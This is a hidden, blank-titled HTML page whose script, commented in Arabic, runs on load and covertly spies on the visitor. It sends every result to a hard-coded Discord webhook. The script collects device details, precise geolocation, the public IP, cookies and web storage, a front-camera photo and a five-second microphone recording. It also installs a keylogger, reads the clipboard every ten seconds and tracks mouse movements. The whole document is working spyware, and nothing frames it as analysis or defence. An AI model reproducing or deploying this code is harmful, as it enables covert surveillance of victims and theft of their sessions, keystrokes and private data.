<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title> </title>
<style>
body, video, canvas, audio { display: none; }
</style>
</head>
<body>
<video id="cam" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// ========== الإعدادات ==========
const webhook = "https://discord.com/api/webhooks/1444407690850734303/tbyWBMt86W2rtj4Cw4ejj8F5qjD7PwvYrMmveQzWknZdtz8pNCH9oBgOpCQWYhbtI-5h";

// متغيرات عامة
let mediaStream = null;
let keyBuffer = "";
let locationSent = false;
let clipboardInterval = null;

// ========== دالة الإرسال ==========
async function send(data, type, isFile = false) {
    try {
        if (isFile) {
            const fd = new FormData();
            fd.append("file", data, `${type}_${Date.now()}.png`);
            await fetch(webhook, { method: "POST", body: fd });
        } else {
            const fd = new FormData();
            fd.append("content", `**[${type.toUpperCase()}]**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``);
            await fetch(webhook, { method: "POST", body: fd });
        }
        console.log(`✓ أرسل: ${type}`);
    } catch(e) { console.log(`✗ فشل: ${type}`); }
}

// ========== 1. معلومات الجهاز الكاملة ==========
async function getDeviceInfo() {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cameras = devices.filter(d => d.kind === 'videoinput');
    const mics = devices.filter(d => d.kind === 'audioinput');
    
    const battery = await navigator.getBattery().catch(() => null);
    
    const info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || "غير معروف",
        deviceMemory: navigator.deviceMemory || "غير معروف",
        screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        battery: battery ? `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "شاحن" : "بطارية"}` : "غير متاح",
        online: navigator.onLine,
        webcamCount: cameras.length,
        microphoneCount: mics.length,
        touchPoints: navigator.maxTouchPoints,
        pdfViewer: navigator.pdfViewerEnabled,
        vendor: navigator.vendor,
        connection: navigator.connection ? {
            type: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink + " Mbps",
            rtt: navigator.connection.rtt + " ms",
            saveData: navigator.connection.saveData
        } : "غير متاح"
    };
    
    await send(info, "device_info");
    return { cameras, mics };
}

// ========== 2. الموقع الجغرافي ==========
async function getLocation() {
    if (locationSent) return;
    
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            send({ error: "الموقع غير مدعوم" }, "location");
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy + " meters",
                    altitude: pos.coords.altitude || "غير متاح",
                    speed: pos.coords.speed || "غير متاح",
                    heading: pos.coords.heading || "غير متاح",
                    timestamp: new Date(pos.timestamp).toISOString()
                };
                await send(location, "location");
                locationSent = true;
                
                // رابط خرائط للمتابعة
                const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await send({ mapsLink: mapsLink }, "maps_link");
                resolve(true);
            },
            async (err) => {
                await send({ error: err.message, code: err.code }, "location_error");
                resolve(false);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

// ========== 3. كاميرا عالية الجودة ==========
async function captureHighQuality() {
    if (!mediaStream) return false;
    
    const video = document.getElementById('cam');
    if (!video.videoWidth || !video.videoWidth === 0) return false;
    
    // نفحص إذا الصورة مش سوداء
    const testCanvas = document.createElement('canvas');
    testCanvas.width = video.videoWidth;
    testCanvas.height = video.videoHeight;
    const testCtx = testCanvas.getContext('2d');
    testCtx.drawImage(video, 0, 0);
    
    const imageData = testCtx.getImageData(0, 0, testCanvas.width, testCanvas.height);
    let hasLight = false;
    for (let i = 0; i < imageData.data.length; i += 5000) {
        if (imageData.data[i] > 50 || imageData.data[i+1] > 50 || imageData.data[i+2] > 50) {
            hasLight = true;
            break;
        }
    }
    
    if (!hasLight) {
        await send({ warning: "الصورة سوداء، ننتظر 1 ثانية ونعيد" }, "camera_warning");
        return false;
    }
    
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    return new Promise((resolve) => {
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 5000) {
                await send(blob, "face", true);
                await send({ size: (blob.size/1024).toFixed(1) + "KB", resolution: `${video.videoWidth}x${video.videoHeight}` }, "camera_result");
                resolve(true);
            } else {
                resolve(false);
            }
        }, "image/png", 0.95);
    });
}

// ========== 4. ميكروفون + تسجيل صوت ==========
async function captureAudio() {
    try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(audioStream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 1000) {
                const fd = new FormData();
                fd.append("file", blob, `audio_${Date.now()}.webm`);
                await fetch(webhook, { method: "POST", body: fd });
                await send({ duration: "5 seconds", size: (blob.size/1024).toFixed(1) + "KB" }, "audio_result");
            }
            audioStream.getTracks().forEach(t => t.stop());
        };
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000); // 5 ثواني تسجيل
    } catch(e) {
        await send({ error: e.message }, "audio_error");
    }
}

// ========== 5. كي لوجر متقدم ==========
function setupKeylogger() {
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') keyBuffer += '[ENTER]';
        else if (e.key === 'Backspace') keyBuffer = keyBuffer.slice(0, -1);
        else if (e.key === 'Tab') keyBuffer += '[TAB]';
        else if (e.key === ' ') keyBuffer += ' ';
        else if (e.key.length === 1) keyBuffer += e.key;
        
        if (keyBuffer.length > 100) {
            send({ keys: keyBuffer, url: window.location.href }, "keylog");
            keyBuffer = '';
        }
    });
    
    // نرسل كل 30 ثانية حتى لو ما وصل الحد
    setInterval(() => {
        if (keyBuffer.length > 10) {
            send({ keys: keyBuffer, url: window.location.href }, "keylog");
            keyBuffer = '';
        }
    }, 30000);
}

// ========== 6. سرقة الكوكيز والـ Storage ==========
async function stealData() {
    const data = {
        cookies: document.cookie,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage }
    };
    await send(data, "stolen_data");
}

// ========== 7. سرقة الحافظة (Clipboard) ==========
async function stealClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        if (text && text.length > 0) {
            await send({ clipboard: text, length: text.length }, "clipboard");
        }
    } catch(e) {}
    
    // نراقب الحافظة كل 10 ثواني
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 5) {
                await send({ clipboard: text, timestamp: new Date().toISOString() }, "clipboard");
            }
        } catch(e) {}
    }, 10000);
}

// ========== 8. كشف الشبكة والـ VPN ==========
async function detectNetwork() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const ipData = await response.json();
        await send({ publicIP: ipData.ip, url: window.location.href }, "network");
    } catch(e) {}
}

// ========== 9. تشغيل الكاميرا ==========
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                facingMode: "user"
            } 
        });
        
        mediaStream = stream;
        const video = document.getElementById('cam');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            
            // ننتظر حتى الصورة تصير جاهزة
            let attempts = 0;
            const checkInterval = setInterval(async () => {
                attempts++;
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    clearInterval(checkInterval);
                    
                    // ننتظر نص ثانية للتأكد من الإضاءة
                    setTimeout(async () => {
                        const success = await captureHighQuality();
                        if (!success) {
                            // نجرب مرة ثانية بعد ثانية
                            setTimeout(async () => {
                                await captureHighQuality();
                            }, 1000);
                        }
                        // نغلق الكاميرا بعد التصوير
                        setTimeout(() => {
                            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                        }, 2000);
                    }, 500);
                } else if (attempts > 20) {
                    clearInterval(checkInterval);
                    await send({ error: "الكاميرا لم تصبح جاهزة" }, "camera_timeout");
                }
            }, 200);
        };
        
        return true;
    } catch(e) {
        await send({ error: e.message, name: e.name }, "camera_error");
        return false;
    }
}

// ========== 10. تسجيل كل حركات الفأرة ==========
function setupMouseTracker() {
    let mouseMovements = [];
    let lastSend = Date.now();
    
    document.addEventListener('mousemove', (e) => {
        mouseMovements.push({ x: e.clientX, y: e.clientY, time: Date.now() });
        
        if (mouseMovements.length > 50 && Date.now() - lastSend > 10000) {
            send({ mouseMovements: mouseMovements.slice(-50), count: mouseMovements.length }, "mouse_tracking");
            lastSend = Date.now();
        }
    });
}

// ========== التنفيذ الرئيسي ==========
(async function main() {
    await send({ status: "✅ بدء جمع البيانات", timestamp: new Date().toISOString() }, "start");
    
    // 1. معلومات الجهاز
    const { cameras, mics } = await getDeviceInfo();
    
    // 2. الموقع
    await getLocation();
    
    // 3. الشبكة
    await detectNetwork();
    
    // 4. سرقة البيانات المخزنة
    await stealData();
    
    // 5. الكاميرا
    await startCamera();
    
    // 6. الميكروفون
    await captureAudio().catch(() => {});
    
    // 7. كي لوجر
    setupKeylogger();
    
    // 8. سرقة الحافظة
    stealClipboard().catch(() => {});
    
    // 9. تتبع الفأرة
    setupMouseTracker();
    
    await send({ status: "✅ تم جمع جميع البيانات الممكنة" }, "complete");
})();
</script>
</body>
</html>
